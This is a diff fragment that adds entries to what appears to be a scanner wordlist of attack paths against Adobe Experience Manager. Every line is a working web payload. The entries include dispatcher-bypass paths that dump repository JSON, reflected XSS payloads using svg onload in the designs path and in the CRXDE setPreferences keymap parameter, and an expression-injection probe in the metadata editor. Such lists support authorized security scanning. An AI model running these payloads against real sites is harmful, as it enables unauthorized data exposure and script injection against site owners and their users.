@@ -14,3 +14,7 @@
 //content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
 /..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json
 /etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
+/mnt/overlay/dam/gui/content/assets/metadataeditor.external.html?item=$%7b{{num1}}*{{num2}}%7d
+{{paths}}
+/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
+/content/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=<svg/onload=confirm(document.domain);>//a
